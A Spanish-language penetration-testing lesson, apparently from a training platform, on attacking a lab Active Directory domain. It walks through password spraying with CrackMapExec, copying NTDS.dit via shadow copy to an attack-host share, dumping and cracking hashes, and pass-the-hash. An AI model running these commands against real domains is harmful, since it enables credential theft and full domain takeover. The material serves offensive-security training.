`Active Directory` (`AD`) es un servicio de directorio común y crítico en las redes empresariales modernas. AD es algo que encontraremos repetidamente, por lo que debemos estar familiarizados con varios métodos que podemos usar para atacar y defender estos entornos AD. Es seguro concluir que si la organización usa Windows, entonces AD se usa para gestionar esos sistemas Windows. Atacar AD es un tema tan extenso y significativo que tenemos múltiples módulos que cubren AD.

En esta sección, nos centraremos principalmente en cómo podemos extraer credenciales mediante el uso de un `dictionary attack against AD accounts` y `dumping hashes` del archivo `NTDS.dit`.

Como muchos de los ataques que hemos cubierto hasta ahora, nuestro objetivo debe ser accesible a través de la red. Esto significa que es muy probable que necesitemos tener un punto de apoyo establecido en la red interna a la que está conectado el objetivo. Dicho esto, hay situaciones en las que una organización puede estar usando reenvío de puertos para reenviar el protocolo de escritorio remoto (`3389`) u otros protocolos utilizados para el acceso remoto en su [edge router](https://www.cisco.com/c/en/us/products/routers/what-is-an-edge-router.html) a un sistema en su red interna. Ten en cuenta que la mayoría de los métodos cubiertos en este módulo simulan los pasos después de un compromiso inicial, y se establece un punto de apoyo en una red interna. Antes de profundizar en los métodos de ataque, consideremos el proceso de autenticación una vez que un sistema Windows se ha unido al dominio. Este enfoque nos ayudará a comprender mejor la importancia de Active Directory y los ataques de contraseña a los que puede ser susceptible.

![AD Authentication](https://academy.hackthebox.com/storage/modules/147/ADauthentication_diagram.png)

Una vez que un sistema Windows se une a un dominio, `no longer default to referencing the SAM database to validate logon requests`. Ese sistema unido al dominio ahora enviará todas las solicitudes de autenticación para ser validadas por el controlador de dominio antes de permitir que un usuario inicie sesión. Esto no significa que la base de datos SAM ya no se pueda usar. Alguien que desee iniciar sesión usando una cuenta local en la base de datos SAM aún puede hacerlo especificando el `hostname` del dispositivo seguido del `Username` (Ejemplo: `WS01/nameofuser`) o con acceso directo al dispositivo, luego escribiendo `./` en la interfaz de inicio de sesión en el campo `Username`. Esto es digno de consideración porque debemos ser conscientes de qué componentes del sistema se ven afectados por los ataques que realizamos. También puede darnos vías adicionales de ataque a considerar al atacar sistemas operativos de escritorio Windows o sistemas operativos de servidor Windows con acceso físico directo o a través de una red. Ten en cuenta que también podemos estudiar los ataques NTDS rastreando esta [técnica](https://attack.mitre.org/techniques/T1003/003/).

---

## Dictionary Attacks against AD accounts using CrackMapExec

Ten en cuenta que un ataque de diccionario es esencialmente usar la potencia de una computadora para adivinar un nombre de usuario y/o contraseña utilizando una lista personalizada de posibles nombres de usuario y contraseñas. Puede ser bastante `noisy` (fácil de detectar) realizar estos ataques a través de una red porque pueden generar mucho tráfico de red y alertas en el sistema objetivo, así como eventualmente ser denegados debido a las restricciones de intentos de inicio de sesión que pueden aplicarse mediante el uso de [Group Policy](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831791(v=ws.11)).

Cuando nos encontramos en un escenario donde un ataque de diccionario es un paso viable, podemos beneficiarnos de intentar `custom tailor` nuestro ataque tanto como sea posible. En este caso, podemos considerar la organización con la que estamos trabajando para realizar el compromiso y utilizar búsquedas en varios sitios web de redes sociales y buscar un directorio de empleados en el sitio web de la empresa. Hacer esto puede resultar en obtener los nombres de los empleados que trabajan en la organización. Una de las primeras cosas que un nuevo empleado obtendrá es un nombre de usuario. Muchas organizaciones siguen una convención de nombres al crear nombres de usuario de empleados. Aquí hay algunas convenciones comunes a considerar:

| Username Convention                 | Practical Example for Jane Jill Doe |
| ----------------------------------- | ----------------------------------- |
| `firstinitiallastname`              | jdoe                                |
| `firstinitialmiddleinitiallastname` | jjdoe                               |
| `firstnamelastname`                 | janedoe                             |
| `firstname.lastname`                | jane.doe                            |
| `lastname.firstname`                | doe.jane                            |
| `nickname`                          | doedoehacksstuff                    

A menudo, la estructura de una dirección de correo electrónico nos dará el nombre de usuario del empleado (estructura: username@domain). Por ejemplo, de la dirección de correo electrónico `jdoe`@`inlanefreight.com`, vemos que `jdoe` es el nombre de usuario.

Un consejo de MrB3n: A menudo podemos encontrar la estructura del correo electrónico buscando en Google el nombre de dominio, es decir, "@inlanefreight.com" y obtener algunos correos electrónicos válidos. A partir de ahí, podemos usar un script para raspar varios sitios de redes sociales y crear posibles nombres de usuario válidos. Algunas organizaciones intentan ofuscar sus nombres de usuario para evitar el spraying, por lo que pueden aliasar su nombre de usuario como a907 (o algo similar) de vuelta a joe.smith. De esa manera, los mensajes de correo electrónico pueden llegar, pero el nombre de usuario interno real no se divulga, lo que hace que el spraying de contraseñas sea más difícil. A veces, puedes usar google dorks para buscar "inlanefreight.com filetype:pdf" y encontrar algunos nombres de usuario válidos en las propiedades del PDF si se generaron utilizando un editor de gráficos. A partir de ahí, puedes discernir la estructura del nombre de usuario y potencialmente escribir un pequeño script para crear muchas combinaciones posibles y luego hacer spraying para ver si alguna resulta válida.

### Creating a Custom list of Usernames

Supongamos que hemos hecho nuestra investigación y reunimos una lista de nombres basada en información públicamente disponible. Mantendremos la lista relativamente corta para esta lección porque las organizaciones pueden tener una gran cantidad de empleados. Lista de nombres de ejemplo:

- Ben Williamson
- Bob Burgerstien
- Jim Stevenson
- Jill Johnson
- Jane Doe

Podemos crear una lista personalizada en nuestro host de ataque usando los nombres anteriores. Podemos usar un editor de texto basado en línea de comandos como `Vim` o un editor de texto gráfico para crear nuestra lista. Nuestra lista puede verse algo así:

```r
cat usernames.txt 
bwilliamson
benwilliamson
ben.willamson
willamson.ben
bburgerstien
bobburgerstien
bob.burgerstien
burgerstien.bob
jstevenson
jimstevenson
jim.stevenson
stevenson.jim
```

Por supuesto, esto es solo un ejemplo y no incluye todos los nombres, pero nota cómo podemos incluir una convención de nombres diferente para cada nombre si aún no sabemos la convención de nombres utilizada por la organización objetivo.

Podemos crear nuestras listas manualmente o usar un `automated list generator` como la herramienta basada en Ruby [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) para convertir una lista de nombres reales en formatos comunes de nombres de usuario. Una vez que la herramienta se ha clonado en nuestro host de ataque local usando `Git`, podemos ejecutarla contra una lista de nombres reales como se muestra en el ejemplo de salida a continuación:

```r
./username-anarchy -i /home/ltnbob/names.txt 

ben
benwilliamson
ben.williamson
benwilli
benwill
benw
b.williamson
bwilliamson
wben
w.ben
williamsonb
williamson
williamson.b
williamson.ben
bw
bob
bobburgerstien
bob.burgerstien
bobburge
bobburg
bobb
b.burgerstien
bburgerstien
bbob
b.bob
burgerstienb
burgerstien
burgerstien.b
burgerstien.bob
bb
jim
jimstevenson
jim.stevenson
jimsteve
jimstev
jims
j.stevenson
jstevenson
sjim
s.jim
stevensonj
stevenson
stevenson.j
stevenson.jim
js
jill
jilljohnson
jill.johnson
jilljohn
jillj
j.johnson
jjohnson
jjill
j.jill
johnsonj
johnson
johnson.j
johnson.jill
jj
jane
janedoe
jane.doe
janed
j.doe
jdoe
djane
d.jane
doej
doe
doe.j
doe.jane
jd
```

Usar herramientas automatizadas puede ahorrarnos tiempo al crear listas. Aún así, nos beneficiaremos de pasar tanto tiempo como podamos intentando descubrir la convención de nombres que una organización está utilizando con los nombres de usuario porque esto reducirá la necesidad de adivinar la convención de nombres.

Es ideal limitar la necesidad de adivinar tanto como sea posible al realizar ataques de contraseñas.

### Launching the Attack with Crack

MapExec

Una vez que tengamos nuestras listas preparadas o descubramos la convención de nombres y algunos nombres de empleados, podemos lanzar nuestro ataque contra el controlador de dominio objetivo usando una herramienta como CrackMapExec. Podemos usarla junto con el protocolo SMB para enviar solicitudes de inicio de sesión al controlador de dominio objetivo. Aquí está el comando para hacerlo:

```r
crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt

SMB         10.129.201.57     445    DC01           [*] Windows 10.0 Build 17763 x64 (name:DC-PAC) (domain:dac.local) (signing:True) (SMBv1:False)
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2017 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2016 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2015 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2014 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2013 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:P@55w0rd STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:P@ssw0rd! STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [+] inlanefrieght.local\bwilliamson:P@55w0rd! 
```

En este ejemplo, CrackMapExec está usando SMB para intentar iniciar sesión como usuario (`-u`) `bwilliamson` usando una lista de contraseñas (`-p`) que contiene una lista de contraseñas comúnmente usadas (`/usr/share/wordlists/fasttrack.txt`). Si los administradores configuraron una política de bloqueo de cuentas, este ataque podría bloquear la cuenta que estamos apuntando. Al momento de escribir esto (enero de 2022), una política de bloqueo de cuentas no se aplica por defecto con las políticas de grupo predeterminadas que se aplican a un dominio de Windows, lo que significa que es posible que encontremos entornos vulnerables a este ataque exacto que estamos practicando.

### Event Logs from the Attack

![Eventlogs from the attack](https://academy.hackthebox.com/storage/modules/147/events_dc.png)

Puede ser útil saber qué podría haber dejado un ataque. Saber esto puede hacer que nuestras recomendaciones de remediación sean más impactantes y valiosas para el cliente con el que estamos trabajando. En cualquier sistema operativo Windows, un administrador puede navegar a `Event Viewer` y ver los eventos de Seguridad para ver las acciones exactas que se registraron. Esto puede informar decisiones para implementar controles de seguridad más estrictos y ayudar en cualquier investigación potencial que pueda estar involucrada después de una violación.

Una vez que hayamos descubierto algunas credenciales, podríamos proceder a intentar obtener acceso remoto al controlador de dominio objetivo y capturar el archivo NTDS.dit.

---

## Capturing NTDS.dit

`NT Directory Services` (`NTDS`) es el servicio de directorio utilizado con AD para encontrar y organizar recursos de red. Recuerda que el archivo `NTDS.dit` se almacena en `%systemroot%/ntds` en los controladores de dominio en un [forest](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/using-the-organizational-domain-forest-model). El `.dit` significa [directory information tree](https://docs.oracle.com/cd/E19901-01/817-7607/dit.html). Este es el archivo de base de datos principal asociado con AD y almacena todos los nombres de usuario del dominio, hashes de contraseñas y otra información de esquema crítica. Si este archivo se puede capturar, podríamos potencialmente comprometer todas las cuentas del dominio de manera similar a la técnica que cubrimos en la sección `Attacking SAM` de este módulo. Mientras practicamos esta técnica, considera la importancia de proteger AD y piensa en algunas formas de evitar que este ataque ocurra.

### Connecting to a DC with Evil-WinRM

Podemos conectarnos a un DC objetivo usando las credenciales que capturamos.

```r
evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```

Evil-WinRM se conecta a un objetivo usando el servicio Windows Remote Management combinado con el PowerShell Remoting Protocol para establecer una sesión de PowerShell con el objetivo.

### Checking Local Group Membership

Una vez conectados, podemos verificar qué privilegios tiene `bwilliamson`. Podemos comenzar mirando la membresía del grupo local usando el comando:

```r
*Evil-WinRM* PS C:\> net localgroup

Aliases for \\DC01

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Account Operators
*Administrators
*Allowed RODC Password Replication Group
*Backup Operators
*Cert Publishers
*Certificate Service DCOM Access
*Cryptographic Operators
*Denied RODC Password Replication Group
*Distributed COM Users
*DnsAdmins
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Incoming Forest Trust Builders
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Pre-Windows 2000 Compatible Access
*Print Operators
*RAS and IAS Servers
*RDS Endpoint Servers
*RDS Management Servers
*RDS Remote Access Servers
*Remote Desktop Users
*Remote Management Users
*Replicator
*Server Operators
*Storage Replica Administrators
*Terminal Server License Servers
*Users
*Windows Authorization Access Group
The command completed successfully.
```

Estamos buscando ver si la cuenta tiene derechos de administrador local. Para hacer una copia del archivo NTDS.dit, necesitamos derechos de administrador local (grupo de Administradores) o administrador de dominio (grupo de Administradores de Dominio) (o derechos equivalentes). También querremos verificar qué privilegios de dominio tenemos.

### Checking User Account Privileges including Domain

```r
*Evil-WinRM* PS C:\> net user bwilliamson

User name                    bwilliamson
Full Name                    Ben Williamson
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/13/2022 12:48:58 PM
Password expires             Never
Password changeable          1/14/2022 12:48:58 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/14/2022 2:07:49 PM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Domain Admins
The command completed successfully.
```

Esta cuenta tiene derechos tanto de Administradores como de Administradores de Dominio, lo que significa que podemos hacer prácticamente cualquier cosa que queramos, incluida la creación de una copia del archivo NTDS.dit.

### Creating Shadow Copy of C:

Podemos usar `vssadmin` para crear una [Volume Shadow Copy](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) (`VSS`) del disco C: o de cualquier volumen que el administrador haya elegido al instalar AD inicialmente. Es muy probable que NTDS se almacene en C: ya que esa es la ubicación predeterminada seleccionada durante la instalación, pero es posible cambiar la ubicación. Usamos VSS para esto porque está diseñado para hacer copias de volúmenes que pueden ser leídos y escritos activamente sin necesidad de detener una aplicación o sistema en particular. VSS es utilizado por muchos programas diferentes de copia de seguridad y recuperación ante desastres para realizar operaciones.

```r
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:

vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```

### Copying NTDS.dit from the VSS

Podemos copiar el archivo NTDS.dit de la copia sombra del volumen C: a otra ubicación en el disco para prepararnos para mover NTDS.dit a nuestro host de ataque.

```r
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit



        1 file(s) copied.
```

Antes de copiar NTDS.dit a nuestro host de ataque, podemos usar la técnica que aprendimos anteriormente para crear un recurso compartido SMB en nuestro host de ataque. Si es necesario, puedes volver a la sección `Attacking SAM` para revisar ese método.

### Transferring NTDS.dit to Attack Host

Ahora `cmd.exe /c move` se puede usar para mover el archivo del DC objetivo al recurso compartido en nuestro host de ataque.

```r
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 

        1 file(s) moved.		
```

### A Faster Method: Using cme to Capture NTDS.dit

Alternativamente, podemos beneficiarnos de usar CrackMapExec para lograr los mismos pasos mostrados arriba, todo con un solo comando. Este comando nos permite utilizar VSS para capturar y volcar rápidamente el contenido del archivo NTDS.dit convenientemente dentro de nuestra sesión de terminal.

```r
crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds

SMB         10.129.201.57    445     DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefrieght.local) (signing:True) (SMBv1:False)
SMB         10.129.201.57    445     DC01             [+] inlanefrieght.local\bwilliamson:P@55w0rd! (Pwn3d!)
SMB         10.129.201.57    445     DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         10.129.201.57    445     DC01           Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         10.129.201.57    445     DC01           Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.201.57    445     DC01           DC01$:1000:aad3b435b51404eeaad3b435b51404ee:e6be3fd362edbaa873f50e384a02ee68:::
SMB         10.129.201.57    445     DC01           krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cbb8a44ba74b5778a06c2d08b4ced802:::
SMB         10.129.201.57    445     DC01           inlanefrieght.local\jim:1104:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
SMB         10.129.201.57    445     DC01           WIN-IAUBULPG5MZ:1105:aad3b435b51404eeaad3b435b51404ee:4f3c625b54aa03e471691f124d5bf1cd:::
SMB         10.129.201.57    445     DC01           WIN-NKHHJGP3SMT:1106:aad3b435b51404eeaad3b435b51404ee:a74cc84578c16a6f81ec90765d5eb95f:::
SMB         10.129.201.57    445     DC01           WIN-K5E9CWYEG7Z:1107:aad3b435b51404eeaad3b435b51404ee:ec209bfad5c41f919994a45ed10e0f5c:::
SMB         10.129.201.57    445     DC01           WIN-5MG4NRVHF2W:1108:aad3b435b51404eeaad3b435b51404ee:7ede00664356820f2fc9bf10f4d62400:::
SMB         10.129.201.57    445     DC01           WIN-UISCTR0XLKW:1109:aad3b435b51404eeaad3b435b51404ee:cad1b8b25578ee07a7afaf5647e558ee:::
SMB         10.129.201.57    445     DC01           WIN-ETN7BWMPGXD:1110:aad3b435b51404eeaad3b435b51404ee:edec0ceb606cf2e35ce4f56039e9d8e7:::
SMB         10.129.201.57    445     DC01           inlanefrieght.local\bwilliamson:1125:aad3b435b51404eeaad3b435b51404ee:bc23a1506bd3c8d3a533680c516bab27:::
SMB         10.129.201.57    445     DC01           inlanefrieght.local\bburgerstien:1126:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
SMB         10.129.201.57    445     DC01           inlanefrieght.local\jstevenson:1131:aad3b435b51404eeaad3b435b51404ee:bc007082d32777855e253fd4defe70ee:::
SMB         10.129.201.57    445     DC01           inlanefrieght.local\jjohnson:1133:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
SMB         10.129.201.57    445     DC01           inlanefrieght.local\jdoe:1134:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         10.129.201.57    445     DC01           Administrator:aes256-cts-hmac-sha1-96:cc01f5150bb4a7dda80f30fbe0ac00bed09a413243c05d6934bbddf1302bc552
SMB         10.129.201.57    445     DC01           Administrator:aes128-cts-hmac-sha1-96:bd99b6a46a85118cf2a0df1c4f5106fb
SMB         10.129.201.57    445     DC01           Administrator:des-cbc-md5:618c1c5ef780cde3
SMB         10.129.201.57    445     DC01           DC01$:aes256-cts-hmac-sha1-96:113ffdc64531d054a37df36a07ad7c533723247c4dbe84322341adbd71fe93a9
SMB         10.129.201.57    445     DC01           DC01$:aes128-cts-hmac-sha1-96:ea10ef59d9ec03a4162605d7306cc78d
SMB         10.129.201.57    445     DC01           DC01$:des-cbc-md5:a2852362e50eae92
SMB         10.129.201.57    445     DC01           krbtgt:aes256-cts-hmac-sha1-96:1eb8d5a94ae5ce2f2d179b9bfe6a78a321d4d0c6ecca8efcac4f4e8932cc78e9
SMB         10.129.201.57    445     DC01           krbtgt:aes128-cts-hmac-sha1-96:1fe3f211d383564574609eda482b1fa9
SMB         10.129.201.57    445     DC01           krbtgt:des-cbc-md5:9bd5017fdcea8fae
SMB         10.129.201.57    445     DC01           inlanefrieght.local\jim:aes256-cts-hmac-sha1-96:4b0618f08b2ff49f07487cf9899f2f7519db9676353052a61c2e8b1dfde6b213
SMB         10.129.201.57    445     DC01          

 inlanefrieght.local\jim:aes128-cts-hmac-sha1-96:d2377357d473a5309505bfa994158263
SMB         10.129.201.57    445     DC01           inlanefrieght.local\jim:des-cbc-md5:79ab08755b32dfb6
SMB         10.129.201.57    445     DC01           WIN-IAUBULPG5MZ:aes256-cts-hmac-sha1-96:881e693019c35017930f7727cad19c00dd5e0cfbc33fd6ae73f45c117caca46d
SMB         10.129.201.57    445     DC01           WIN-IAUBULPG5MZ:aes128-cts-hmac-sha1-
     [+] Dumped 61 NTDS hashes to /home/bob/.cme/logs/DC01_10.10.15.30_2022-01-19_133529.ntds of which 15 were added to the database
```

---

## Cracking Hashes & Gaining Credentials

Podemos proceder creando un archivo de texto que contenga todos los hashes NT, o podemos copiar y pegar individualmente un hash específico en una sesión de terminal y usar Hashcat para intentar crackear el hash y obtener una contraseña en texto claro.

### Cracking a Single Hash with Hashcat

```r
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

64f12cddaa88057e06a81b54e73b949b:Password1
```

En muchas de las técnicas que hemos cubierto hasta ahora, hemos tenido éxito al crackear hashes que hemos obtenido.

`¿Qué pasa si no tenemos éxito al crackear un hash?`

---

## Pass-the-Hash Considerations

Aún podemos usar hashes para intentar autenticarnos con un sistema usando un tipo de ataque llamado `Pass-the-Hash` (`PtH`). Un ataque PtH aprovecha el [NTLM authentication protocol](https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm#:~:text=NTLM%20uses%20an%20encrypted%20challenge,to%20the%20secured%20NTLM%20credentials) para autenticar a un usuario usando un hash de contraseña. En lugar de `username`:`clear-text password` como el formato para iniciar sesión, podemos usar `username`:`password hash`. Aquí hay un ejemplo de cómo funcionaría esto:

### Pass-the-Hash with Evil-WinRM Example

```r
evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```

Podemos intentar usar este ataque cuando necesitemos movernos lateralmente a través de una red después del compromiso inicial de un objetivo. Más sobre PtH se cubrirá en el módulo `AD Enumeration and Attacks`.